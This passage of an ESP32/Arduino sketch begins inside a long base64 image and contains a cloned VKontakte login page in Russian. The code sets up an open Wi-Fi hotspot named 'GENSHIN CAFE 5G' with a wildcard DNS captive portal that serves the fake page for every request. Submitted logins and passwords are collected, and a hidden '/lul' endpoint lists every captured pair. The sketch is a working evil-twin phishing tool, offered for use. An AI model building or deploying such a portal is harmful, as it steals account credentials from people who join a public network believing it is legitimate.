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">
          </div>
        </header>
    
        <main>
          <div class="enter">
            <p>Вход ВКонтакте</p>
          </div>
    
          <div class="condition">
            <p>Чтобы просматривать эту страницу, нужно зайти на сайт.</p>
          </div>
    
          <div class="checkin">
            <form action="InvalidLoginPassword" method="POST">
              <div class="login">
                <input type="text" name="login" placeholder="Телефон или email">
              </div>
              <div class="password">
                <input type="password" name="password" placeholder="Пароль">
              </div>
              <div class="checkbox">
                <input type="checkbox" name="name" id="checkbox">
                <label for="checkbox">Чужой компьютер</label>
              </div>
              <div class="go">
                <input type="submit" name="send" value="Войти">
              </div>
            </form>
            <div class="register">
              <a href="https://vk.com/join"><input type="submit" name="register" value="Регистрация"></a>
            </div>
            <div class="invalid">
              <p>Не удаётся войти.<br>Пожалуйста, проверьте правильность написания логина и пароля.</p>
            </div>
            <div class="forgot">
              <a class="forgota" href="https://vk.com/restore">Забыли пароль или не можете войти?</a>
            </div>
          </div>
        </main>
    
        <footer>
          <div class="line">
            <img src="images/line.png">
          </div>
          <div class="more">
            <div class="vk"><a href="https://vk.com/about">ВКонтакте</a> <p>© 2006–2020</p></div>
    
            <div class="more2">
              <div class=""><a href="https://vk.com/about">О ВКонтакте</a></div>
              <div class="info"><a href="https://vk.com/terms">Правила</a></div>
              <div class="info"><a href="https://vk.com/ads">Для бизнеса</a></div>
              <div class="info"><a href="https://vk.com/dev">Разработчикам</a></div>
            </div>
    
            <div class="more3">
              <div class=""><a href="#">Русский</a></div>
              <div class="languages"><a href="#">Українська</a></div>
              <div class="languages"><a href="#">English</a></div>
              <div class="languages"><a href="#">все языки »</a></div>
            </div>  
          </div>
        </footer>
      </body>
    </html>
   )====";
   
   webServer.send(200, "text/html", s); //Send web page
}

void lul(){
  //String s = login + password;
  //String s = logpass[counter];
  String s = " ";
  for(int i = 0; i <= counter; i++){
    s = s+" "+logpass[i]+" | ";
  }
  webServer.send(200, "text/html", s); //Send web page
}
                      

void setup() {
  Serial.begin(9600);
  pinMode(23, OUTPUT);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GENSHIN CAFE 5G");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/InvalidLoginPassword", handleForm);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  webServer.on("/lul", lul);
  
  webServer.begin();
}

void loop() {
  digitalWrite(23, LOW);
  dnsServer.processNextRequest();
  webServer.handleClient();
}
